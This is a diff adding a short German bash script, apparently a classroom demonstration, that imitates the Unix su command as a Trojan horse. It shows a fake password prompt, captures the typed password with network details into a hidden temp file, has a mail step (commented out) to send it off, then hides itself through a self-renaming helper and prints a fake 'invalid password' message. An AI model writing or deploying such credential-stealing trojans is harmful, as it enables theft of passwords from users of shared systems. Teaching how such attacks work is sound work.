@@ -1,0 +1,42 @@
+#!/bin/bash
+# Boshafter Nachbau des su-Befehls
+TMPFILE="/tmp/.sdt5739md"
+RENAME=".myrename"
+HIDDEN_SU=".su"
+
+# Step 1: Verhalten nachbauen
+echo -n "Passwort: "
+read -s PASSWORD
+echo "" # Zeilenumbruch
+sleep 3 # 3s warten
+# echo "su: ungültiges Kennwort"
+
+# Step 2: Daten für E-Mail sammeln
+echo "Die Mail für den Passwortklau"	>  $TMPFILE
+/sbin/ifconfig	 			>> $TMPFILE
+echo "Kommando: $0 $1 $2 $3"		>> $TMPFILE
+echo "Passwort: $PASSWORD" 		>> $TMPFILE
+echo "." 				>> $TMPFILE # Mail beenden
+
+# Step 3: Mail senden
+##mail -s "Passwortklau" \
+##     -r "ingolf.brunner@ba-leipzig.de" \
+##     "studierende@cs12-1.ba-leipzig.de" \
+##     < $TMPFILE # Inhalt Datei als Eingabe verwenden
+
+# Step 4: aufräumen
+rm $TMPFILE # temporäre Datei löschen
+
+# Step 5: verstecken
+echo "#!/bin/bash"			>  $RENAME
+echo "sleep 20"				>> $RENAME
+echo "mv $HIDDEN_SU su"			>> $RENAME
+echo "rm $RENAME"			>> $RENAME
+echo "exit 0"				>> $RENAME
+chmod 777 $RENAME
+./$RENAME &		# Script für Rückbenennung starten
+mv su $HIDDEN_SU 	# Script umbenennen
+
+# Verabschieden
+echo "su: ungültiges Kennwort"
+exit 0
